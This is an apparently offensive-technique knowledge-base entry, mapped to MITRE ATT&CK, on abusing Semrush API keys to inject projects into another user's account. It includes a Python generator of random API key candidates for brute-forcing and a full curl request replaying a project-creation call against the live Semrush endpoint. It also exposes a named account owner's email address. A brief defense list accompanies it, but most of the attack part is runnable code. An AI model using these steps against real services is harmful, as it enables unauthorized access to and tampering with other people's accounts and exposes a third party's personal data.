---
tags:
  - cross-user
  - api-key-abuse
type: procedure
tools:
  - '[[tools/Python]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/cross-user-semrush-project-injection]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
  - '[[External Remote Services]]'
updated_at: '2025-12-14T17:31:11.267Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: eea2dc7c-ebdd-4480-acf3-8d8689705e42
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[External Remote Services]]'
---
# Cross-User-Project-Injection-via-API-Key-Reuse

## Summary

This procedure uses a different user's API key to replay the project creation request, injecting arbitrary projects into another account without authentication, highlighting the risk of API key compromise.

## Description

With access to another user's API key (e.g., via phishing or leak), replay the request to the Semrush API. The endpoint processes the request based only on the key, associating the new project with the key's owner (cleganearya1@gmail.com), enabling stealthy modifications or malicious injections without victim knowledge.

## Requirements

1. API key for target user (cleganearya1@gmail.com)
2. Captured request template from prior steps
3. HTTP client for replay

## Defense

Defensive measures and detection strategies:

- Scope API keys to specific actions and IP ranges
- Require multi-factor for API key generation/usage
- Detect unusual project additions (e.g., mismatched domains)
- Use anomaly detection on API key activity across accounts

## Objectives

1. Add projects to unauthorized accounts
2. Exploit key reuse for lateral movement
3. Illustrate potential for malicious content injection

## Instructions

### Step 1: Obtain Target API Key

**Context**: Assume key acquisition via social engineering or brute-force (not executed here).

**Command** ([[commands/generate-api-key-bruteforce]]):
```python
import string
import random
def id_generator(size=32, char=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(char) for _ in range(size))
i=1
while(i<=n):
    print(id_generator())
    i+=1
```

> Run with n=1000 to generate candidates; test via API (policy limits actual brute-force).

### Step 2: Replay with Target Key

**Context**: Substitute the API key and send the request.

**Command** ([[commands/cross-user-semrush-project-injection]]):
```bash
curl -X POST "https://www.semrush.com/projects/api/projects/?key=█████████" \
  -H "Host: www.semrush.com" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0" \
  -H "Content-Type: application/json" \
  -H "Cookie: cfduid=...; PHPSESSID=...; ..." \
  -d '{"domain":"Walterwhite12.com","name":"Walterwhite12.com","url":"Walterwhite12.com","acl":{"write":true}}'
```

> Expected output: HTTP 200 with JSON showing project ID 1266027 and email cleganearya1@gmail.com.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Valid Accounts]] Valid Accounts
- [[External Remote Services]] External Remote Services

### Sub-Techniques


## Commands Used

- [[commands/cross-user-semrush-project-injection]]
- [[commands/generate-api-key-bruteforce]]

## Tools Used

- [[tools/Python]]

## Tags

- cross-user
- api-key-abuse
